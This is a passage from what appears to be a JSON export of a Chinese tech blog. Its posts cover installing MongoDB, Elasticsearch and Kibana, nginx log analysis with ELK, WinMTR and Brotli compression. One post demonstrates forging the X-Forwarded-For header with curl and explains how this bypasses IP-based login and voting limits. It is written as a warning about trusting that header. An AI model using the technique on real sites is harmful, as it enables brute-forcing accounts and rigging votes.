gpgkey=https://www.mongodb.org/static/pgp/server-3.6.asc 然后执行 yum -y install mongodb-org","text":"安装[root@node-1 ~]# cat /etc/yum.repos.d/mongodb-org-3.6.repo [mongodb-org-3.6] name=MongoDB Repository baseurl=https://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/3.6/x86_64/ gpgcheck=1 enabled=1 gpgkey=https://www.mongodb.org/static/pgp/server-3.6.asc 然后执行 yum -y install mongodb-org 启动systemctl enable mongod.service systemctl start mongod.service systemctl status mongod.service 连接mongodb的默认端口是27017，使用mongo –host 指定地址连接 [root@node-1 ~]# mongo --host 127.0.0.1:27017 MongoDB shell version v3.6.0 connecting to: mongodb://127.0.0.1:27017/ MongoDB server version: 3.6.0 Server has startup warnings: 2017-12-20T17:12:40.249+0800 I STORAGE [initandlisten] 2017-12-20T17:12:40.249+0800 I STORAGE [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine 2017-12-20T17:12:40.249+0800 I STORAGE [initandlisten] ** See http://dochub.mongodb.org/core/prodnotes-filesystem 2017-12-20T17:12:40.367+0800 I CONTROL [initandlisten] 2017-12-20T17:12:40.367+0800 I CONTROL [initandlisten] ** WARNING: Access control is not enabled for the database. 2017-12-20T17:12:40.367+0800 I CONTROL [initandlisten] ** Read and write access to data and configuration is unrestricted. 2017-12-20T17:12:40.367+0800 I CONTROL [initandlisten] 2017-12-20T17:12:40.367+0800 I CONTROL [initandlisten] 2017-12-20T17:12:40.367+0800 I CONTROL [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is &apos;always&apos;. 2017-12-20T17:12:40.367+0800 I CONTROL [initandlisten] ** We suggest setting it to &apos;never&apos; 2017-12-20T17:12:40.367+0800 I CONTROL [initandlisten] 2017-12-20T17:12:40.367+0800 I CONTROL [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/defrag is &apos;always&apos;. 2017-12-20T17:12:40.367+0800 I CONTROL [initandlisten] ** We suggest setting it to &apos;never&apos; 2017-12-20T17:12:40.367+0800 I CONTROL [initandlisten] 执行基本的运算 &gt; 2+2 4 &gt; 3+3*2233 6702在x集合中插入10 并查询&gt; db.runoob.insert({x:10}) WriteResult({ &quot;nInserted&quot; : 1 }) &gt; db.runoob.find() { &quot;_id&quot; : ObjectId(&quot;5a3a2b34d603e2d7ed10cf8b&quot;), &quot;x&quot; : 10 } &gt;报错解决报错 2017-12-20T17:12:40.367+0800 I CONTROL [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is &apos;always&apos;.这个错误意思就是允许hugepage可以动态分配，而不是系统启动时预先分配，看上去对内存消耗很大的服务都不喜欢它。感觉这是一个lazy loading的设计思想。 解决 [root@node-1 ~]# echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled [root@node-1 ~]# echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag连接mongodo格式： mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]] mongodb:// 这是固定的格式，必须要指定。 username:password@ 可选项，如果设置，在连接数据库服务器之后，驱动都会尝试登陆这个数据库 host1 必须的指定至少一个host, host1 是这个URI唯一要填写的。它指定了要连接服务器的地址。如果要连接复制集，请指定多个主机地址。 portX 可选的指定端口，如果不填，默认为27017 /database 如果指定username:password@，连接并验证登陆指定数据库。若不指定，默认打开 test 数据库。 ?options 是连接选项。如果不使用/database，则前面需要加上/。所有连接选项都是键值对name=value，键值对之间通过&amp;或;（分号）隔开 选项 描述 replicaSet=name 验证replica set的名称。 Impliesconnect=replicaSet. slaveOk=true|false true:在connect=direct模式下，驱动会连接第一台机器，即使这台服务器不是主。在connect=replicaSet模式下，驱动会发送所有的写请求到主并且把读取操作分布在其他从服务器。false: 在 connect=direct模式下，驱动会自动找寻主服务器. 在connect=replicaSet 模式下，驱动仅仅连接主服务器，并且所有的读写命令都连接到主服务器。 safe=true|false true: 在执行更新操作之后，驱动都会发送getLastError命令来确保更新成功。(还要参考 wtimeoutMS).false: 在每次更新之后，驱动不会发送getLastError来确保更新成功。 w=n 驱动添加 { w : n } 到getLastError命令. 应用于safe=true。 wtimeoutMS=ms 驱动添加 { wtimeout : ms } 到 getlasterror 命令. 应用于 safe=true. fsync=true|false true: 驱动添加 { fsync : true } 到 getlasterror 命令.应用于 safe=true.false: 驱动不会添加到getLastError命令中。 journal=true|false 如果设置为 true, 同步到 journal (在提交到数据库前写入到实体中). 应用于 safe=true connectTimeoutMS=ms 可以打开连接的时间。 socketTimeoutMS=ms 发送和接受sockets的时间。","categories":[],"tags":[{"name":"mongodb","slug":"mongodb","permalink":"https://awen.me/tags/mongodb/"}]},{"title":"使用 ELK 分析和展示日志","slug":"使用-ELK-分析和展示-Nginx-日志","date":"2017-12-18T02:07:39.000Z","updated":"2021-02-26T06:05:29.302Z","comments":true,"path":"posts/33155.html","link":"","permalink":"https://awen.me/posts/33155.html","excerpt":"ELK 能干什么 ELK 是 elasticsearch + logstash + kibana 的 简写，互联网行业高速发展的今天，当企业的业务发展到一定的规模后，各种服务每天所产生的日志达到一定的量级后，一旦出现故障或问题，我们很难通过简单的过滤和分析日志，因此我们需要一个强大的工具来汇总、搜索和查询以及展现日志来实现复杂的业务所产生的日志，快速的定位和分析问题。ELK 就可以做到这些。 通过 logstash 我们可以把各种日志进行转换后存储到 elasticsearch 中，通过 elasticsearch 可以非常灵活的存储和索引日志，并且elasticsearch 提供了丰富的 HTTP REST API 接口来对数据进行增删查等操作；通过 kibana 我们可以对存储在 elasticsearch 中的日志以图形化的形式进行展现，并且提供非常丰富的过滤接口，让用户能够通过过滤快速定位问题。 下载软件本文档所使用的都是官方最新的5.x版本，操作系统版本 centos 7 ，不过在我写该改文档之后，我发现还是6.x 的好用些。 wget -c https://artifacts.elastic.co/downloads/logstash/logstash-5.6.5.rpm wget -c https://artifacts.elastic.co/downloads/kibana/kibana-6.6.5-x86_64.rpm wget -c https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.6.5.rpm","text":"ELK 能干什么 ELK 是 elasticsearch + logstash + kibana 的 简写，互联网行业高速发展的今天，当企业的业务发展到一定的规模后，各种服务每天所产生的日志达到一定的量级后，一旦出现故障或问题，我们很难通过简单的过滤和分析日志，因此我们需要一个强大的工具来汇总、搜索和查询以及展现日志来实现复杂的业务所产生的日志，快速的定位和分析问题。ELK 就可以做到这些。 通过 logstash 我们可以把各种日志进行转换后存储到 elasticsearch 中，通过 elasticsearch 可以非常灵活的存储和索引日志，并且elasticsearch 提供了丰富的 HTTP REST API 接口来对数据进行增删查等操作；通过 kibana 我们可以对存储在 elasticsearch 中的日志以图形化的形式进行展现，并且提供非常丰富的过滤接口，让用户能够通过过滤快速定位问题。 下载软件本文档所使用的都是官方最新的5.x版本，操作系统版本 centos 7 ，不过在我写该改文档之后，我发现还是6.x 的好用些。 wget -c https://artifacts.elastic.co/downloads/logstash/logstash-5.6.5.rpm wget -c https://artifacts.elastic.co/downloads/kibana/kibana-6.6.5-x86_64.rpm wget -c https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.6.5.rpm 安装 Java本例使用 openjdk # yum -y install java-1.8.0配置 Java 环境变量将以下内容复制粘贴到 /etc/profile 最末端 export JAVA_HOME=/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.102-1.b14.el7_2.x86_64 export PATH=$PATH:$JAVA_HOME/bin export CLASSPATH=.:$JAVA_HOME/jre/lib:$JAVA_HOME/lib:$JAVA_HOME/lib/tools.jar然后执行 source /etc/profile查看 Java 版本 [root@node-1 ~]# java -version openjdk version &quot;1.8.0_151&quot; OpenJDK Runtime Environment (build 1.8.0_151-b12) OpenJDK 64-Bit Server VM (build 25.151-b12, mixed mode)安装软件本例下载的全部都是 rpm 包，直接执行 rpm -ivh *.rpm启动 elasticsearch [root@node-1 ~]# sudo systemctl daemon-reload [root@node-1 ~]# sudo systemctl enable elasticsearch.service [root@node-1 ~]# sudo systemctl start elasticsearch.service启动 logstash [root@node-1 ~]# systemctl enable logstash [root@node-1 ~]# systemctl start logstash如果提示没有 JAVA_HOME，运行 export JAVACMD=`which java`后重装 启动 kibana [root@node-1 ~]# systemctl enable kibana [root@node-1 ~]# systemctl start kibana安装 nginxyum -y install epel-release yum -y install nginx使用 nginx 反向代理 kibana我这里还配置个证书 [root@centos logstash]# cat /usr/local/nginx/conf/vhost/elk.v5linux.com.conf server { listen 443; server_name elk.v5linux.com; ssl on; ssl_certificate /etc/nginx/ssl/elk.cer; ssl_certificate_key /etc/nginx/ssl/elk.key; ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5; ssl_prefer_server_ciphers on; ssl_protocols TLSv1.2; ssl_session_cache shared:SSL:50m; ssl_session_timeout 1d; ssl_session_tickets on; resolver 114.114.114.114 valid=300s; resolver_timeout 10s; add_header Strict-Transport-Security &quot;max-age=31536000; includeSubDomains; preload&quot;; add_header X-Frame-Options deny; add_header X-Content-Type-Options nosniff; add_header Accept-Ranges bytes; add_header X-Forwarded-For $remote_addr; add_header X-Real-IP $remote_addr; location / { rewrite ^/(.*) /$1 break; proxy_ignore_client_abort on; proxy_pass http://localhost:5601; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Host $http_host; } if ($time_iso8601 ~ &quot;^(\\d{4})-(\\d{2})-(\\d{2})&quot;) { set $year $1; set $month $2; set $day $3; } access_log /home/wwwlogs/elk.v5linux.com-$year-$month-$day-access.log main; }访问URL 出现如图所示则表示反向代理 kibana 成功。 访问http://xxxx/status 查看状态 配置 logstash我们需要配置 logstash 来获取 nginx 的日志并写入到 elasticsearch 中 在 nginx 的 http 段加入 log_format main &apos;{&quot;@timestamp&quot;:&quot;$time_iso8601&quot;,&apos; &apos;&quot;@source&quot;:&quot;$server_addr&quot;,&apos; &apos;&quot;hostname&quot;:&quot;$hostname&quot;,&apos; &apos;&quot;ip&quot;:&quot;$http_x_forwarded_for&quot;,&apos; &apos;&quot;client&quot;:&quot;$remote_addr&quot;,&apos; &apos;&quot;request_method&quot;:&quot;$request_method&quot;,&apos; &apos;&quot;scheme&quot;:&quot;$scheme&quot;,&apos; &apos;&quot;domain&quot;:&quot;$server_name&quot;,&apos; &apos;&quot;referer&quot;:&quot;$http_referer&quot;,&apos; &apos;&quot;request&quot;:&quot;$request_uri&quot;,&apos; &apos;&quot;args&quot;:&quot;$args&quot;,&apos; &apos;&quot;size&quot;:$body_bytes_sent,&apos; &apos;&quot;status&quot;: $status,&apos; &apos;&quot;responsetime&quot;:$request_time,&apos; &apos;&quot;upstreamtime&quot;:&quot;$upstream_response_time&quot;,&apos; &apos;&quot;upstreamaddr&quot;:&quot;$upstream_addr&quot;,&apos; &apos;&quot;http_user_agent&quot;:&quot;$http_user_agent&quot;,&apos; &apos;&quot;https&quot;:&quot;$https&quot;&apos; &apos;}&apos;;替换默认的日志格式，该格式会默认就输出 json 格式的日志，如： {&quot;@timestamp&quot;:&quot;2017-12-18T18:54:21+08:00&quot;,&quot;@source&quot;:&quot;192.168.10.38&quot;,&quot;hostname&quot;:&quot;centos.novalocal&quot;,&quot;ip&quot;:&quot;-&quot;,&quot;client&quot;:&quot;123.58.160.155&quot;,&quot;request_method&quot;:&quot;GET&quot;,&quot;scheme&quot;:&quot;https&quot;,&quot;domain&quot;:&quot;elk.v5linux.com&quot;,&quot;referer&quot;:&quot;https://elk.v5linux.com/status&quot;,&quot;request&quot;:&quot;/plugins/kibana/assets/dashboard.svg&quot;,&quot;args&quot;:&quot;-&quot;,&quot;size&quot;:0,&quot;status&quot;: 304,&quot;responsetime&quot;:0.003,&quot;upstreamtime&quot;:&quot;0.003&quot;,&quot;upstreamaddr&quot;:&quot;127.0.0.1:5601&quot;,&quot;http_user_agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36&quot;,&quot;https&quot;:&quot;on&quot;}然后将需要监控的虚拟主机的access_log 定义成如下格式: access_log /home/wwwlogs/elk.v5linux.com-xxx main;最后定义 logstash [root@centos logstash]# cd /etc/logstash/conf.d/ [root@centos conf.d]# cat nginx.conf input { file { type =&gt; &quot;nginx&quot; start_position =&gt; &quot;beginning&quot; path =&gt; [ &quot;/home/wwwlogs/elk.v5linux.com-*.log&quot; ] codec =&gt; &quot;json&quot; } } output { elasticsearch { hosts =&gt; [&quot;192.168.10.37:9200&quot;] index =&gt; &quot;elk.v5linux.com-%{+YYYY.MM.dd}&quot; workers =&gt; 1 flush_size =&gt; 1 idle_flush_time =&gt; 1 template_overwrite =&gt; true } stdout{codec =&gt; rubydebug} }一个 logstash 必须包含 input 和 output，因为这里默认就把 nginx 的日志定义成了 json，所以少了很多事情，如果你是需要用 grok 的方式定义格式，则需要定义一个 filter，不过 nginx 的 filter 可以直接在 Apache 的grok 的基础上修改。 定义完成后 重启 logstash 。然后打开 kibana，点击dev_tools 执行默认的 GET _search { &quot;query&quot;: { &quot;match_all&quot;: {} } }出现类似如图所示的内容即表示成功把 nginx 的日志导入了elasticsearch 中。 接下来，我们就是来配置 kibana 展现日志了！ 配置 kibana1.点击如图所示的地方，导入一个Index Patterns 配置 index patterns 创建完成后会出现如图所示的界面 2.切换到discover 会看到很多日志条目以及一个漂亮的柱形图，他显示对应时间点的请求数 可以根据条件过滤日志 3.切换到 visualize，我们来创建几个监控图。 首先，创建一个Pie，用来统计某个时间段的 HTTP 请求方法，比如 GET POST PUT DELETE 等等的占比。 选择 Pie，选择 index patterns，根据如图所示配置 其实还是觉得6.1的 kibana 功能丰富点，但是3.x 的界面黑色的很好看。 Vertical Bar 点击 dashboards 创建一个 dashboards 点击 ADD 添加刚才创建的 visualize ，如图所示，然后保存 可以选择时间或在图形框中拖动鼠标选择时间线查看对应时间点的请求 你可以继续添加 visualize 监控其他指标，比如请求状态码、请求做多的 IP 或 URL 等等，最终配置如图所示 本案例所有软件都安装在一台服务器上，在实际的生产环境中必然不会这么干，因此部署 elasticsearch 集群等请参考 《elasticsearch 权威指南》 参考elasticsearch 官网文档 elasticseach 权威指南","categories":[],"tags":[]},{"title":"Centos 安装和配置 Kibana","slug":"Centos-安装和配置-Kibana","date":"2017-12-15T04:25:35.000Z","updated":"2021-02-26T06:05:29.242Z","comments":true,"path":"posts/13007.html","link":"","permalink":"https://awen.me/posts/13007.html","excerpt":"kibana下载在这里下载","text":"kibana下载在这里下载 修改配置文件 [root@centos config]# cat kibana.yml # Kibana is served by a back end server. This setting specifies the port to use. server.port: 5601 # Specifies the address to which the Kibana server will bind. IP addresses and host names are both valid values. # The default is &apos;localhost&apos;, which usually means remote machines will not be able to connect. # To allow connections from remote users, set this parameter to a non-loopback address. server.host: &quot;0.0.0.0&quot;运行 [root@centos bin]# ./kibana log [03:45:26.232] [info][status][plugin:kibana@6.1.0] Status changed from uninitialized to green - Ready log [03:45:26.299] [info][status][plugin:elasticsearch@6.1.0] Status changed from uninitialized to yellow - Waiting for Elasticsearch log [03:45:26.369] [info][status][plugin:console@6.1.0] Status changed from uninitialized to green - Ready log [03:45:26.450] [info][status][plugin:metrics@6.1.0] Status changed from uninitialized to green - Ready log [03:45:26.600] [info][status][plugin:elasticsearch@6.1.0] Status changed from yellow to green - Ready log [03:45:26.849] [info][status][plugin:timelion@6.1.0] Status changed from uninitialized to green - Ready log [03:45:26.853] [info][listening] Server running at http://0.0.0.0:5601 点击 console，可以调试 elasticsearch 结合 logstash + elasticsearch + kibana 可以配置如图所示的监控","categories":[],"tags":[]},{"title":"Centos 安装和配置 Elasticsearch","slug":"Centos-安装和配置-Elasticsearch","date":"2017-12-14T12:22:44.000Z","updated":"2021-02-26T06:05:29.242Z","comments":true,"path":"posts/46526.html","link":"","permalink":"https://awen.me/posts/46526.html","excerpt":"什么是 ElasticsearchElasticsearch is a distributed RESTful search engine built for the cloud. Features include:","text":"什么是 ElasticsearchElasticsearch is a distributed RESTful search engine built for the cloud. Features include: Distributed and Highly Available Search Engine.Each index is fully sharded with a configurable number of shards.Each shard can have one or more replicas.Read / Search operations performed on any of the replica shards. Multi Tenant.Support for more than one index.Index level configuration (number of shards, index storage, …). Various set of APIsHTTP RESTful APINative Java API.All APIs perform automatic node operation rerouting. Document orientedNo need for upfront schema definition.Schema can be defined for customization of the indexing process. Reliable, Asynchronous Write Behind for long term persistency. (Near) Real Time Search. Built on top of LuceneEach shard is a fully functional Lucene indexAll the power of Lucene easily exposed through simple configuration / plugins. Per operation consistencySingle document level operations are atomic, consistent, isolated and durable. Open Source under the Apache License, version 2 (“ALv2”) 下载Github: 点这里点击这里下载 [root@ubuntu ~]# wget -c https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.1.0.rpm安装 Javayum -y install java安装[root@ubuntu ~]# rpm -ivh elasticsearch-6.1.0.rpm 警告：elasticsearch-6.1.0.rpm: 头V4 RSA/SHA512 Signature, 密钥 ID d88e42b4: NOKEY 准备中... ################################# [100%] Creating elasticsearch group... OK Creating elasticsearch user... OK 正在升级/安装... 1:elasticsearch-0:6.1.0-1 ################################# [100%] ### NOT starting on installation, please execute the following statements to configure elasticsearch service to start automatically using systemd sudo systemctl daemon-reload sudo systemctl enable elasticsearch.service ### You can start elasticsearch service by executing sudo systemctl start elasticsearch.service执行 [root@ubuntu ~]# sudo systemctl daemon-reload [root@ubuntu ~]# sudo systemctl enable elasticsearch.service Created symlink from /etc/systemd/system/multi-user.target.wants/elasticsearch.service to /usr/lib/systemd/system/elasticsearch.service. [root@ubuntu ~]# sudo systemctl start elasticsearch.service [root@ubuntu ~]# sudo systemctl status elasticsearch.service ● elasticsearch.service - Elasticsearch Loaded: loaded (/usr/lib/systemd/system/elasticsearch.service; enabled; vendor preset: disabled) Active: active (running) since 四 2017-12-14 20:26:12 CST; 12s ago Docs: http://www.elastic.co Main PID: 9712 (java) CGroup: /system.slice/elasticsearch.service └─9712 /bin/java -Xms1g -Xmx1g -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+AlwaysPreTo... 12月 14 20:26:12 ubuntu.novalocal systemd[1]: Started Elasticsearch. 12月 14 20:26:12 ubuntu.novalocal systemd[1]: Starting Elasticsearch...配置文件[root@ubuntu ~]# vim /etc/elasticsearch/elasticsearch.yml [root@ubuntu ~]# cat /etc/elasticsearch/elasticsearch.yml # ======================== Elasticsearch Configuration ========================= # # NOTE: Elasticsearch comes with reasonable defaults for most settings. # Before you set out to tweak and tune the configuration, make sure you # understand what are you trying to accomplish and the consequences. # # The primary way of configuring a node is via this file. This template lists # the most important settings you may want to configure for a production cluster. # # Please consult the documentation for further information on configuration options: # https://www.elastic.co/guide/en/elasticsearch/reference/index.html # # ---------------------------------- Cluster ----------------------------------- # # Use a descriptive name for your cluster: # #cluster.name: my-application # 集群名称 # # ------------------------------------ Node ------------------------------------ # # Use a descriptive name for the node: # #node.name: node-1 # 节点信息 # # Add custom attributes to the node: # #node.attr.rack: r1 # # ----------------------------------- Paths ------------------------------------ # # Path to directory where to store the data (separate multiple locations by comma): # path.data: /var/lib/elasticsearch # 数据存储路径 # # Path to log files: # path.logs: /var/log/elasticsearch # 日志路径 # # ----------------------------------- Memory ----------------------------------- # # Lock the memory on startup: # #bootstrap.memory_lock: true # # Make sure that the heap size is set to about half the memory available # on the system and that the owner of the process is allowed to use this # limit. # # Elasticsearch performs poorly when the system is swapping the memory. # # ---------------------------------- Network ----------------------------------- # # Set the bind address to a specific IP (IPv4 or IPv6): # #network.host: 192.168.0.1 # # Set a custom port for HTTP: # #http.port: 9200 # 端口，默认9200 # # For more information, consult the network module documentation. # # --------------------------------- Discovery ---------------------------------- # # Pass an initial list of hosts to perform discovery when new node is started: # The default list of hosts is [&quot;127.0.0.1&quot;, &quot;[::1]&quot;] # #discovery.zen.ping.unicast.hosts: [&quot;host1&quot;, &quot;host2&quot;] # # Prevent the &quot;split brain&quot; by configuring the majority of nodes (total number of master-eligible nodes / 2 + 1): # #discovery.zen.minimum_master_nodes: # # For more information, consult the zen discovery module documentation. # # ---------------------------------- Gateway ----------------------------------- # # Block initial recovery after a full cluster restart until N nodes are started: # #gateway.recover_after_nodes: 3 # # For more information, consult the gateway module documentation. # # ---------------------------------- Various ----------------------------------- # # Require explicit names when deleting indices: # #action.destructive_requires_name: true插入数据[root@ubuntu ~]# curl -XPUT &apos;http://localhost:9200/twitter/doc/1?pretty&apos; -H &apos;Content-Type: application/json&apos; -d &apos; &gt; { &gt; &quot;user&quot;: &quot;kimchy&quot;, &gt; &quot;post_date&quot;: &quot;2009-11-15T13:12:00&quot;, &gt; &quot;message&quot;: &quot;Trying out Elasticsearch, so far so good?&quot; &gt; }&apos; { &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 1, &quot;result&quot; : &quot;created&quot;, &quot;_shards&quot; : { &quot;total&quot; : 2, &quot;successful&quot; : 1, &quot;failed&quot; : 0 }, &quot;_seq_no&quot; : 0, &quot;_primary_term&quot; : 1 }获取数据[root@ubuntu ~]# curl -XGET &apos;http://localhost:9200/twitter/doc/1?pretty=true&apos; { &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 1, &quot;found&quot; : true, &quot;_source&quot; : { &quot;user&quot; : &quot;kimchy&quot;, &quot;post_date&quot; : &quot;2009-11-15T13:12:00&quot;, &quot;message&quot; : &quot;Trying out Elasticsearch, so far so good?&quot; } }搜索数据[root@ubuntu ~]# curl -XGET &apos;http://localhost:9200/twitter/_search?q=user:kimchy&amp;pretty=true&apos; { &quot;took&quot; : 93, &quot;timed_out&quot; : false, &quot;_shards&quot; : { &quot;total&quot; : 5, &quot;successful&quot; : 5, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 }, &quot;hits&quot; : { &quot;total&quot; : 2, &quot;max_score&quot; : 0.2876821, &quot;hits&quot; : [ { &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;doc&quot;, &quot;_id&quot; : &quot;2&quot;, &quot;_score&quot; : 0.2876821, &quot;_source&quot; : { &quot;user&quot; : &quot;kimchy&quot;, &quot;post_date&quot; : &quot;2009-11-15T14:12:12&quot;, &quot;message&quot; : &quot;Another tweet, will it be indexed?&quot; } }, { &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.2876821, &quot;_source&quot; : { &quot;user&quot; : &quot;kimchy&quot;, &quot;post_date&quot; : &quot;2009-11-15T13:12:00&quot;, &quot;message&quot; : &quot;Trying out Elasticsearch, so far so good?&quot; } } ] } }","categories":[],"tags":[]},{"title":"Windows WinMtr 的使用","slug":"Windows-WinMtr-的使用","date":"2017-12-13T07:01:50.000Z","updated":"2021-02-26T06:05:29.268Z","comments":true,"path":"posts/27119.html","link":"","permalink":"https://awen.me/posts/27119.html","excerpt":"1.下载，地址点这里","text":"1.下载，地址点这里 2.解压后找到如图所示程序，双击打开 3.输入要测的 IP ，点击 start 开始，建议多测几分钟后停止，也可以到处 txt或 html 文档。","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://awen.me/tags/Windows/"}]},{"title":"伪造IP 请求网站","slug":"伪造IP-请求网站","date":"2017-12-12T08:26:29.000Z","updated":"2021-02-26T06:05:29.300Z","comments":true,"path":"posts/16558.html","link":"","permalink":"https://awen.me/posts/16558.html","excerpt":"在 http 头中有一个字段：X-Forwarded-For，该字段是一个 HTTP 扩展头部。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 RFC 7239（Forwarded HTTP Extension）标准之中。 假设一个场景，你的网站使用了 CDN 加速， CDN 会隐藏掉你源站的真实 IP， 当请求到达时，会先请求到 CDN 边缘节点，而后转发到源站，此时你可以把 CDN 当做是一个代理服务器，事实上，它也确实是一个代理服务器。","text":"在 http 头中有一个字段：X-Forwarded-For，该字段是一个 HTTP 扩展头部。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 RFC 7239（Forwarded HTTP Extension）标准之中。 假设一个场景，你的网站使用了 CDN 加速， CDN 会隐藏掉你源站的真实 IP， 当请求到达时，会先请求到 CDN 边缘节点，而后转发到源站，此时你可以把 CDN 当做是一个代理服务器，事实上，它也确实是一个代理服务器。 字段介绍X-Forwarded-For 请求头格式非常简单，就这样： X-Forwarded-For: client, proxy1, proxy2其内容由英文逗号 + 空格隔开的多个部分组成，最开始的是离服务端最远的设备 IP，然后是每一级代理设备的 IP。 如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，服务端最终会收到以下信息： X-Forwarded-For: IP0, IP1, IP2伪造 IP现在很多的网站都会使用代理或 CDN（CDN 本质上也是代理服务器），当启用了代理服务器，后端服务器就无法直接获取客户端的真实 IP 地址了，比如 又拍云 CDN 回源的时候默认传到源站的是 IP 是中转节点的 IP，又拍云会提供2个http 字段 X-Real-IP 和 X-Forwarded-For 来传递真实的客户的 IP，这样即使走 CDN 源站也能通过这2个字段来获取真实的 IP 地址,详见文档 但是 X-Forwarded-For 是可以非常轻易的伪造的，和伪造 referer 一样简单。 比如使用又拍云的 CDN 加速后，如果想拿到真实 IP 只能用又拍提供的获取真实 IP 文档所描述的内容来获取，但是客户的这样请求： curl -X GET https://www.fangwenjun.com/post/54079.html -H &quot;X-Forwarded-For:1.1.1.1&quot; 服务端日志格式如下： log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;&quot;$status&quot; $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot; &apos; &apos;&quot;$gzip_ratio&quot; $request_time $bytes_sent $request_length&apos;;获得的日志内容是 183.131.24.75 - - [13/Dec/2017:14:42:35 +0800] &quot;GET /post/54079.html HTTP/1.1&quot; &quot;200&quot; 28328 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36&quot; &quot;1.1.1.1&quot; &quot;-&quot; 0.000 28716 412 其中 183.131.24.75 是 CDN 回源的 IP ，也就是$remote_addr 这个 IP 是无法伪造的，而我们可以看到 1.1.1.1 对应的就是$http_x_forwarded_for 这个 IP 实际是伪造的。 所以，仅仅通过 X-Forwarded-For 来判断真实 IP 是不可靠的。 那么，利用这个漏洞能干嘛？ 现在很多网站登录的时候都会针对同一 IP 源进行限制访问次数，或者投票系统，如果以 X-Forwarded-For 作为判断真实 IP 为依据，则很轻易的就会被绕过限制进行暴力破解和刷票。","categories":[],"tags":[]},{"title":"为Nginx启用Brotli压缩算法","slug":"为Nginx启用Brotli压缩算法","date":"2017-12-11T08:32:59.000Z","updated":"2021-02-26T06:05:29.297Z","comments":true,"path":"posts/50337.html","link":"","permalink":"https://awen.me/posts/50337.html","excerpt":"什么是 Brotli 压缩算法Brotli最初发布于2015年，用于网络字体的离线压缩。Google软件工程师在2015年9月发布了包含通用无损数据压缩的Brotli增强版本，特别侧重于HTTP压缩。其中的编码器被部分改写以提高压缩比，编码器和解码器都提高了速度，流式API已被改进，增加更多压缩质量级别。新版本还展现了跨平台的性能改进，以及减少解码所需的内存。 与常见的通用压缩算法不同，Brotli使用一个预定义的120千字节字典。该字典包含超过13000个常用单词、短语和其他子字符串，这些来自一个文本和HTML文档的大型语料库。预定义的算法可以提升较小文件的压缩密度。 使用brotli替换deflate来对文本文件压缩通常可以增加20%的压缩密度，而压缩与解压缩速度则大致不变。使用Brotli进行流压缩的内容编码类型已被提议使用“br”。","text":"什么是 Brotli 压缩算法Brotli最初发布于2015年，用于网络字体的离线压缩。Google软件工程师在2015年9月发布了包含通用无损数据压缩的Brotli增强版本，特别侧重于HTTP压缩。其中的编码器被部分改写以提高压缩比，编码器和解码器都提高了速度，流式API已被改进，增加更多压缩质量级别。新版本还展现了跨平台的性能改进，以及减少解码所需的内存。 与常见的通用压缩算法不同，Brotli使用一个预定义的120千字节字典。该字典包含超过13000个常用单词、短语和其他子字符串，这些来自一个文本和HTML文档的大型语料库。预定义的算法可以提升较小文件的压缩密度。 使用brotli替换deflate来对文本文件压缩通常可以增加20%的压缩密度，而压缩与解压缩速度则大致不变。使用Brotli进行流压缩的内容编码类型已被提议使用“br”。 安装1.下载 brotli git clone https://github.com/google/ngx_brotli cd ngx_brotli &amp;&amp; git submodule update --init2.编译 在原有的编译配置后增加 –add-module=/opt/nginx/ngx_brotli 例如 ./configure --prefix=/usr/local/nginx --user=www --group=www --with-pcre=/opt/nginx/pcre-8.41 --with-http_ssl_module --with-zlib=/opt/nginx/zlib-1.2.11 --with-openssl=/opt/nginx/openssl-1.0.2n --add-module=/opt/nginx/ngx_brotli --with-http_v2_module配置，在 http 段加入 http { include mime.types; default_type application/octet-stream; sendfile on; tcp_nopush on; keepalive_timeout 65; #Brotli Compression brotli on; brotli_comp_level 6; brotli_types text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript 